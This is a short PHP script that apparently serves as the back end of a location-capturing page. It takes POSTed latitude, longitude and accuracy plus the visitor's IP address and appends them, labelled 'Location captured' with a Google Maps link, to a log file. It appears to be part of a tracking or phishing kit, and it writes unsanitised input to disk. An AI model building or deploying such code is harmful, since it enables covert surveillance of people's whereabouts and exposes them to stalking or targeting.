<?php
header('Content-Type: text/html');
$lat = $_POST['lat'];
$lon = $_POST['lon'];
$acc = $_POST['acc'];
$ip = $_SERVER['REMOTE_ADDR'];

$data = "Location captured at " . date('Y-m-d H:i:s') . "\n";
$data .= "Google Maps: https://www.google.com/maps/place/" . $lat . "+" . $lon . "\n";
$data .= "Accuracy: " . $acc . " meters\n";
$data .= "IP: " . $ip . "\n";
$data .= "---\n";

file_put_contents('location_log.txt', $data, FILE_APPEND);
?>
